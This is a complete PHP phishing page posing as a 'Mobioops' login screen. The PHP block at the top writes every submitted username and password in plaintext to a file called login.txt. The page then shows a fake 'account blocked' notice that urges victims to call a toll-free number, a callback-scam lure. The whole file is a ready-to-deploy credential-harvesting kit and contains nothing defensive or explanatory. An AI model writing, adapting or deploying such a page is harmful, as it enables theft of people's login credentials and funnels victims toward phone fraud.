<?php
// SINGLE PHP FILE — LOGIN FIRST → BLOCKED AFTER SUBMISSION
// ---------------------------------------------------------

// Default: show login screen
$blocked = false;

// If form submitted, save credentials and switch to blocked view
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Collect input safely
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Prepare log entry
    $entry = "Username: $username | Password: $password | Time: " . date("Y-m-d H:i:s") . "
";

    // Save into login.txt
    file_put_contents("login.txt", $entry, FILE_APPEND);

    // Switch screen
    $blocked = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobioops Login</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }

    .container, .box {
      width: 90%; max-width: 420px; background: white; padding: 30px;
      border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }

    h2 { margin: 0 0 20px; font-size: 26px; font-weight: 700; color: #222; }
    label { font-size: 16px; font-weight: 600; display: block; margin-bottom: 8px; }
    input { width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 18px; }
    button { width: 100%; padding: 14px; background: #2c7d2c; color: white; font-size: 18px; font-weight: 700; border: none; border-radius: 6px; cursor: pointer; }
    button:hover { background: #256a25; }
    .link { margin-top: 18px; text-align: center; font-size: 15px; }
    .link a { color: #000; font-weight: bold; text-decoration: underline; }

    img { width: 90px; margin-bottom: 20px; }
    .call { font-size: 22px; font-weight: 700; color: #1a57ff; text-decoration: underline; }
  </style>
</head>
<body>

<?php if (!$blocked): ?>

  <!-- LOGIN PAGE SHOWN FIRST -->
  <div class="container">
    <h2>Log in</h2>

    <form method="POST" action="">
      <label>Username</label>
      <input type="text" name="username" required />

      <label>Password</label>
      <input type="password" name="password" required />

      <button type="submit">Log In</button>
    </form>

    <div class="link">
      <a href="#">Forgot username or password?</a>
    </div>
  </div>

<?php else: ?>

  <!-- BLOCKED PAGE ONLY SHOWN AFTER FORM SUBMISSION -->
  <div class="box">
    <div style="text-align: center;">
    <img src="assets/images/error.jpg" alt="Error Image">
</div>
    <h3>Your Mobioops account has been blocked due to suspicious login attempts.</h3>
    <p>Please contact customer service to unlock your account.</p>
    <a class="call" href="tel:+1-877-868-1742">Toll Free: +1-877-868-1742</a>
  </div>

<?php endif; ?>

</body>
</html>
